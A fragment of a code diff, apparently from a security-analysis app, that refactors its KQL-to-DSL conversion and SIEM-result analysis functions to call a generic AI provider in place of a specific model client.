     for (const key in variables) {
         populatedQuery = populatedQuery.replace(new RegExp(key, 'g'), `"${variables[key]}"`);
@@ -1143,9 +1093,8 @@ export const convertKqlToDsl = async (
     `;
 
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return JSON.stringify(cleanJsonResponse(response.text()), null, 2);
+        const response = await provider.generateContent(prompt);
+        return JSON.stringify(cleanJsonResponse(response), null, 2);
     } catch (error) {
         console.error("Error in convertKqlToDsl:", error);
         throw new Error(`Failed to convert KQL to DSL. ${error instanceof Error ? error.message : ''}`);
@@ -1156,8 +1105,7 @@ export const analyzeSiemResponse = async (
     siemResponse: string,
     modelName: string
 ): Promise<string> => {
-    await initializeAi();
-    const model = ai.getGenerativeModel({ model: modelName });
+    const provider = getAiProvider(modelName);
     const prompt = `
       You are a senior security analyst. Analyze the following raw Elasticsearch query result from a SIEM.
       Provide a concise summary of the findings. Highlight any suspicious activity, identify key entities (users, hosts, processes), and suggest the next logical step in the investigation.
@@ -1171,9 +1119,8 @@ export const analyzeSiemResponse = async (
       Format your response as a clear, readable markdown report.
     `;
     try {
-        const result = await model.generateContent(prompt);
-        const response = await result.response;
-        return response.text();
+        const response = await provider.generateContent(prompt);
+        return response;
     } catch (error) {
         console.error("Error in analyzeSiemResponse:", error);
         throw new Error(`Failed to analyze SIEM response. ${error instanceof Error ? error.message : ''}`);
